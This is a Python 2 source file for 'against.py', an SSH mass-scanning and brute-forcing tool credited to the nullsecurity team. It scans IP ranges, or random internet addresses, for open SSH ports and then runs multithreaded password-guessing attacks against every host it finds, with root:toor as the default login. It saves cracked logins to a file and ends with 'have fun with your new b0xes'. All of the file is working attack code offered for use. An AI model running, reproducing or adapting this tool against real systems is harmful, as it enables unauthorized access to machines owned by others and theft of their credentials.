#!/usr/bin/env python
# -*- coding: latin-1 -*- ######################################################
#                ____                     _ __                                 #
#     ___  __ __/ / /__ ___ ______ ______(_) /___ __                           #
#    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                           #
#   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                            #
#                                            /___/ team                        #
#                                                                              #
# against.py - mass scanning and brute-forcing script for ssh                  #
#                                                                              #
# FILE                                                                         #
# against.py                                                                   #
#                                                                              #
# DATE                                                                         #
# 2013-06-25                                                                   #
#                                                                              #
# DESCRIPTION                                                                  #
# 'against.py' is a very fast ssh attacking script which includes a            #
# multithreaded port scanning module (tcp connect) for discovering possible    #
# targets and a multithreaded brute-forcing module which attacks               #
# parallel (multiprocessing) all discovered hosts or given ip-adresses         #
# from a list.                                                                 #
#                                                                              #
# AUTHOR                                                                       #
# pigtail23 aka pgt                                                            #
#                                                                              #
################################################################################


from socket import *
import multiprocessing
import threading
import time
import paramiko
import sys
import os
import logging
import argparse
import random


# print our nice banner ;)
def banner():
    print '--==[ against.py by pigtail23@nullsecurity.net ]==--'

# print version
def version():
    print '[+] against.py v0.1'
    exit(0)

# checks if we can write to file which was given by parameter -o
def test_file(filename):
    try:
        outfile = open(filename, 'a')
        outfile.close()
    except:
        print '[-] ERROR: Cannot write to file \'%s\'' % filename
        exit(1)

# defines the command line parameter and help page
def argspage():
    parser = argparse.ArgumentParser(
    usage='\n\n   ./%(prog)s -i <arg> | -r <arg> | -I <arg>',
    formatter_class=argparse.RawDescriptionHelpFormatter,
    epilog=
    'examples:\n\n' \

    '  scanning and attacking random ips\n' \
    '  usage: ./%(prog)s -r 50 -L password.txt\n\n' \

    '  scanning and attacking an ip-range\n' \
    '  usage: ./%(prog)s -i 192.168.0.1-254 -u admin -l troll\n\n' \

    '  attack ips from file\n' \
    '  usage: ./%(prog)s -I ips.txt -L passwords.txt\n',
    add_help=False
    )
    
    options = parser.add_argument_group('options', '')
    options.add_argument('-i', default=False, metavar='<ip/range>',
            help='ip-address/-range (e.g.: 192.168.0-3.1-254)')
    options.add_argument('-I', default=False, metavar='<file>',
            help='list of target ip-addresses')
    options.add_argument('-r', default=False, metavar='<num>',
            help='attack random hosts')
    options.add_argument('-p', default=22, metavar='<num>',
            help='port number of sshd (default: 22)')
    options.add_argument('-t', default=4, metavar='<num>',
            help='threads per host (default: 4)')
    options.add_argument('-f', default=8, metavar='<num>',
            help='attack max hosts parallel (default: 8)')
    options.add_argument('-u', default='root', metavar='<username>',
            help='single username (default: root)')
    options.add_argument('-U', default=False, metavar='<file>',
            help='list of usernames')
    options.add_argument('-l', default='toor', metavar='<password>',
            help='single password (default: toor)')
    options.add_argument('-L', default=False, metavar='<file>',
            help='list of passwords')
    options.add_argument('-o', default=False, metavar='<file>',
            help='write found logins to file')
    options.add_argument('-T', default=3, metavar='<sec>',
            help='timeout in seconds (default: 3)')
    options.add_argument('-V', action='store_true',
            help='print version of against.py and exit')

    args = parser.parse_args()

    if args.V:
        version()

    if (args.i == False) and (args.I == False) and (args.r == False):
        print ''
        parser.print_help()
        exit(0)

    return args

# connect to target and checks for an open port
def scan(target, port, timeout):
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(timeout)
    result = s.connect_ex((target, port))
    s.close()
    if result == 0:
        HOSTLIST.append(target)

# creates 'x' numbers of threads and call scan()
def thread_scan(args, target):
    port = int(args.p)
    to = float(args.T)
    bam = threading.Thread(target=scan, args=(target, port, to,))
    bam.start()
    # scanning with up to 200 threads for targets with open port
    while threading.activeCount() > 200:
        time.sleep(0.0001)
    time.sleep(0.0001)

# only the output when scanning for targets
def scan_output(i):
    sys.stdout.flush()
    sys.stdout.write('\r[*] hosts scanned: {0} | ' \
            'possible to attack: {1}'.format(i, len(HOSTLIST)))

# creates single ips by a given ip-range - parameter -i
def ip_range(args):
    targets = args.i
    a = tuple(part for part in targets.split('.'))
    
    rsa = (range(4))
    rsb = (range(4))
    for i in range(0,4):
        ga = a[i].find('-')
        if ga != -1:
            rsa[i] = int(a[i][:ga])
            rsb[i] = int(a[i][1+ga:]) + 1
        else:
            rsa[i] = int(a[i])
            rsb[i] = int(a[i]) + 1

    print '[*] scanning %s for ssh services' % targets
    m = 0
    for i in range (rsa[0], rsb[0]):
        for j in range (rsa[1], rsb[1]):
            for k in range (rsa[2], rsb[2]):
                for l in range(rsa[3], rsb[3]):
                    target = '%d.%d.%d.%d' % (i, j, k, l)
                    m += 1
                    scan_output(m)
                    thread_scan(args, target)   

    # waiting for the last running threads
    while threading.activeCount() > 1:
        time.sleep(0.1)
    scan_output(m)
    print '\n[*] finished scan.'

# only refactor stuff
def rand():
        return random.randrange(0,256)

# creates random ips
def rand_ip(args):
    i = 0
    print '[*] scanning random ips for ssh services'
    while len(HOSTLIST) < int(args.r):
        target = '%d.%d.%d.%d' % (rand(), rand(), rand(), rand())
        i += 1
        scan_output(i)
        thread_scan(args, target)

    # waiting for the last running threads
    while threading.activeCount() > 1:
        time.sleep(0.1)
    scan_output(i)
    print '\n[*] finished scan.'

# checks if given filename by parameter exists
def file_exists(filename):
    try:
        open(filename).readlines()
    except IOError:
        print '[-] ERROR: cannot open file \'%s\'' % filename
        exit(1)

# read-in a file with ips
def ip_list(ipfile):
    file_exists(ipfile)
    hosts = open(ipfile).readlines()
    for host in hosts:
        HOSTLIST.append(host)

# write all found logins to file - parameter -o
def write_logins(filename, login):
    outfile = open(filename, 'a')
    outfile.write(login)
    outfile.close()

# connect to target and try to login
def crack(target, prt, user, passw, outfile, to, i):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    user = user.replace('\n', '')
    passw = passw.replace('\n', '')
    try:
        ssh.connect(target, port=prt, username=user, password=passw, timeout=to)
        #ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command('uname -a')
        #print ssh_stdout
        login = '[+] login found for %s | %s:%s' % (target, user, passw)
        print login
        if outfile:
            write_logins(outfile, login + '\n')
        ssh.close()
        os._exit(0)
    except paramiko.AuthenticationException:
        ssh.close()
    except:
        ssh.close()
        # after 8 timeouts per request the attack against $target will stopped
        if i < 8:
            i += 1
            # reconnect after random seconds (between 0.2 and 0.5 sec)
            ra = random.uniform(0.2, 0.6)
            time.sleep(ra)
            crack(target, prt, user, passw, outfile, to, i)
        else:
            print '[-] too much timeouts - stopped attack against %s' % (target)
            os._exit(1)

# creates 'x' number of threads and call crack()
def thread_it(target, args):
    port = int(args.p)
    user = args.u
    userlist = args.U
    password = args.l
    passlist = args.L
    outfile = args.o
    to = float(args.T)
    threads = int(args.t)

    if userlist:
        user = open(userlist).readlines()
    else:
        user = [ user ]
    if passlist:
        password = open(passlist).readlines()
    else:
        password = [ password ]

    # looks dirty but we need it :/
    try:
        for us in user:
            for pw in password:
                Run = threading.Thread(target=crack, args=(target, port, us, pw,
                    outfile, to, 0,))
                Run.start()
                # checks that we a max number of threads
                while threading.activeCount() > threads:
                    time.sleep(0.01)
                time.sleep(0.001)

        # waiting for the last running threads
        while threading.activeCount() > 1:
            time.sleep(0.1)
    except KeyboardInterrupt:
        os._exit(1)

# create 'x' child processes (child == cracking routine for only one target)
def fork_it(args):
    threads = int(args.t)
    childs = int(args.f)
    len_hosts = len(HOSTLIST)

    print '[*] attacking %d target(s)\n' \
            '[*] cracking up to %d hosts parallel\n' \
            '[*] threads per host: %d' % (len_hosts, childs, threads)

    i = 1
    for host in HOSTLIST:
        host = host.replace('\n', '')
        print '[*] performing attacks against %s [%d/%d]' % (host, i, len_hosts)
        hostfork = multiprocessing.Process(target=thread_it,
                args=(host, args))
        hostfork.start()
        # checks that we have a max number of childs
        while len(multiprocessing.active_children()) >= childs:
            time.sleep(0.001)
        time.sleep(0.001)
        i += 1

    # waiting for the last running childs
    while multiprocessing.active_children():
        time.sleep(1)

def empty_hostlist():
    if len(HOSTLIST) == 0:
        print '[-] found no targets to attack!'
        exit(1)

# output when against.py finished all routines
def finished():
    print '[*] game over!!! have fun with your new b0xes!'

def main():
    banner()
    args = argspage()

    if args.U:
        file_exists(args.U)
    if args.L:
        file_exists(args.L)
    if args.o:
        test_file(args.o)

    if args.i:
        ip_range(args)
    elif args.I:
        ip_list(args.I)
    else:
        rand_ip(args)
    
    time.sleep(0.1)
    empty_hostlist()
    fork_it(args)
    finished()

if __name__ == '__main__':
    HOSTLIST = []
    try:
        logging.disable(logging.CRITICAL)
        main()
    except KeyboardInterrupt:
        print '\nbye bye!!!'
        time.sleep(0.2)
        os._exit(1)
